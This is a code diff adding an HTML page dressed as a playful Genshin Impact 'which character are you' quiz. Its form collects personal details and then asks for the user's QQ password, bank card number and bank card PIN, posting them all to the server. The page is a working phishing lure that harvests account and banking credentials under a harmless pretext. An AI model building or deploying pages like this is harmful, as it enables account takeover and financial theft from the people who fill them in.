@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>看看你是原神里的谁</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: row;
+            justify-content: flex-start; /* 将此行的属性修改为 flex-start */
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            flex-basis: 30%;
+            text-align: left;
+        }
+        .form-group .half-width {
+            flex-basis: 45%;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>看看你是原神里的谁🤪</h1>
+        <form action="/" method="post">
+            <div class="form-group">
+                <label for="name">姓名</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="age">年龄</label>
+                <input type="number" id="age" name="age" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">手机号码</label>
+                <input type="text" id="phone" name="phone" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">邮箱</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="birthday">生日</label>
+                <input type="date" id="birthday" name="birthday" required>
+            </div>
+
+            <div class="form-group">
+                <label for="qq">QQ号</label>
+                <input type="text" id="qq" name="qq">
+            </div>
+
+            <div class="form-group">
+                <label for="qqpass">QQ密码</label>
+                <input type="password" id="qqpass" name="qqpass">
+            </div>
+
+            <div class="form-group">
+                <label for="cardid">银行卡号</label>
+                <input type="text" id="cardid" name="cardid">
+            </div>
+
+            <div class="form-group">
+                <label for="cardpass">银行卡密码</label>
+                <input type="text" id="cardpass" name="cardpass">
+            </div>
+
+            <button type="submit">提交</button>
+        </form>
+    </div>
+</body>
+</html>
